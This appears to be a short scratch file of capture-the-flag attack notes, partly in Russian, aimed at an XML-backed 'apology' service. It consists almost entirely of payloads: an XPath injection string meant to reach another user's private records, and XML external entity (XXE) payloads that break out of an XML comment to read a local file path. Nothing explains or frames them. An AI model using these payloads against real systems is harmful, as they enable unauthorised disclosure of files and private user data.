# TEST2 это существующий пользователь в этом документе 
# кому принадлежит извинение
name_exploit = "TEST2']/../apology[@private='true"

<root><apologies><apology id="1" private="true" nickname_receiver="A_VOT_NE_SKAZU"><apology_text>HAX1</apology_text></apology></apologies></root>
"""admin
--><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:////home/texh0k0t/kek'>]><!--"""

admin
foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:////home/texh0k0t/kek'>]><root><apologies><apology id='1' private='true' nickname_receiver	='A_VOT_NE_SKAZU'><apology_text>&xxe;</apology_text></apology></apologies></root><!--